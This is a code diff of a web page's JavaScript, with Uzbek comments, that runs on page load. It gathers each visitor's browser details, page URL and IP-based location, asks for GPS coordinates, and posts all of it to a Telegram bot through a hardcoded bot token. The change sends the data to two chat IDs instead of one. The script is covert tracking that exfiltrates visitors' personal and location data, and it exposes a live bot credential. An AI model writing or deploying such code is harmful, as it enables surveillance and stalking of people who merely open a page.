@@ -461,18 +461,18 @@
 
         async function sendTelegramMessage() {
 
-            const token = "8625320668:AAGj7dsfGug7okpHOwtI-_lFufBbGpCmVG0";
-            const chatId = "6625618090";
+    const token = "8625320668:AAGj7dsfGug7okpHOwtI-_lFufBbGpCmVG0";
 
-            let device = navigator.userAgent;
-            let platform = navigator.platform;
-            let language = navigator.language;
-            let page = window.location.href;
+    const chatIds = ["6625618090", "7621436309"]; // ikkita ID
 
-            // IP va joylashuv
-            let ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+    let device = navigator.userAgent;
+    let platform = navigator.platform;
+    let language = navigator.language;
+    let page = window.location.href;
 
-            let text = `
+    let ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+
+    let text = `
 🚨 YANGI FOYDALANUVCHI
 
 🌐 Sahifa:
@@ -497,39 +497,39 @@ ${ipData.city}
 ${new Date().toLocaleString()}
 `;
 
-            // GPS joylashuv (ruxsat bilan)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async pos => {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async pos => {
 
-                    text += `
+            text += `
 📡 GPS Lokatsiya:
 https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}
 `;
 
-                    send(text);
+            send(text);
 
-                }, () => {
-                    send(text + "\n❌ GPS ruxsat berilmadi");
-                });
+        }, () => {
+            send(text + "\n❌ GPS ruxsat berilmadi");
+        });
 
-            } else {
-                send(text);
-            }
+    } else {
+        send(text);
+    }
 
-            async function send(message) {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });
-            }
-
+    async function send(message) {
+        for (let chatId of chatIds) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
         }
+    }
+}
 
         window.addEventListener("load", () => {
             sendTelegramMessage();
